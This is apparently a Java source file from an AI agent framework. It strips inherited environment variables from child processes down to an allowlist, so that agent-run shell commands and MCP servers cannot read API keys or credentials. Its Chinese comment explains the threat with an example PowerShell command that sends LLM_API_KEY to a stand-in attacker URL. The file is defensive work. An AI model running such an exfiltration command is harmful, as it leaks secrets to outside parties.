package com.miniagent.agent.tool;

import java.util.LinkedHashSet;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 子进程环境变量沙箱。
 *
 * <p>默认只把"启动一个进程真正需要"的变量交给子进程，其余一律丢弃。</p>
 *
 * <p><b>为什么必须这么做</b>：agent 进程自己持有一批高价值密钥 —— 对话模型 key
 * （{@code LLM_API_KEY}）、搜索 key（{@code TAVILY_API_KEY}）、数据库口令、云凭证。
 * 而 {@code exec_command} 是一条原始 shell，MCP 服务是模型的工具后端。
 * 子进程继承整份环境时，一条 {@code echo %LLM_API_KEY%} 或
 * {@code powershell -Command "iwr https://attacker/?k=$env:LLM_API_KEY"} 就能把密钥带走，
 * 而这类读取在只读命令白名单里还被判成"安全、幂等、可并行"。</p>
 *
 * <p>需要额外变量的部署（例如某个 CLI 依赖自有的 token 变量）用
 * {@code agent.tools.env-passthrough} 显式列出，让"哪些环境变量会进入模型可影响的进程"
 * 变成一条可审计的清单，而不是默认全给。</p>
 */
public final class ProcessEnv {

    /**
     * 允许继承的变量名（小写比较）。只保留进程启动与基础工具链所必需的：
     * Windows 上缺 {@code SystemRoot}/{@code ComSpec} 会让大量程序直接起不来，
     * POSIX 上缺 {@code PATH}/{@code HOME} 同理。
     */
    private static final Set<String> ALLOWED_KEYS = Set.of(
            // ── 路径与查找 ──
            "path", "pathext", "home", "pwd", "shell", "user", "logname", "username",
            // ── Windows 进程启动必需 ──
            "systemroot", "systemdrive", "windir", "comspec", "temp", "tmp",
            "userprofile", "appdata", "localappdata", "programdata", "allusersprofile",
            "programfiles", "programfiles(x86)", "programw6432",
            "number_of_processors", "processor_architecture", "processor_identifier",
            // ── 语言/区域/时区（影响工具输出编码与时区，出问题时很难查） ──
            "lang", "language", "lc_all", "lc_ctype", "lc_messages", "tz",
            // ── 常见运行时定位 ──
            "java_home", "jre_home", "maven_home", "gradle_user_home",
            "node_path", "pythonpath", "pythonhome", "dotnet_root",
            "git_exec_path", "ssl_cert_file", "ssl_cert_dir", "curl_ca_bundle"
    );

    /** 由配置额外放行的变量名（小写）。 */
    private static final Set<String> EXTRA_ALLOWED_KEYS = ConcurrentHashMap.newKeySet();

    private ProcessEnv() {
    }

    /**
     * 放行额外的环境变量名。逗号或空白分隔；空值不生效。
     * 由 {@link ProcessEnvProperties} 在启动时按 {@code agent.tools.env-passthrough} 调用。
     */
    public static void allowKeys(String csv) {
        if (csv == null || csv.isBlank()) {
            return;
        }
        for (String raw : csv.split("[,\\s]+")) {
            String key = raw.trim().toLowerCase(Locale.ROOT);
            if (!key.isEmpty()) {
                EXTRA_ALLOWED_KEYS.add(key);
            }
        }
    }

    /** 当前生效的放行清单（只读快照，供日志/自检使用）。 */
    public static Set<String> allowedKeys() {
        Set<String> all = new LinkedHashSet<>(ALLOWED_KEYS);
        all.addAll(EXTRA_ALLOWED_KEYS);
        return Set.copyOf(all);
    }

    /**
     * 就地把子进程环境收敛到白名单。大小写不敏感（Windows 环境变量名不区分大小写）。
     *
     * @return 实际被丢弃的变量个数，便于调用方记一条可审计的日志
     */
    public static int sanitize(ProcessBuilder pb) {
        Map<String, String> env = pb.environment();
        Set<String> allowed = new LinkedHashSet<>(ALLOWED_KEYS);
        allowed.addAll(EXTRA_ALLOWED_KEYS);
        int before = env.size();
        env.keySet().removeIf(k -> k == null || !allowed.contains(k.toLowerCase(Locale.ROOT)));
        return before - env.size();
    }

    /** 白名单收敛之后，再合并调用方显式声明的变量（如 MCP server 配置里的 env）。 */
    public static void putDeclared(ProcessBuilder pb, Map<String, String> declared) {
        if (declared == null || declared.isEmpty()) {
            return;
        }
        for (Map.Entry<String, String> e : declared.entrySet()) {
            if (e.getKey() != null && e.getValue() != null) {
                pb.environment().put(e.getKey(), e.getValue());
            }
        }
    }
}
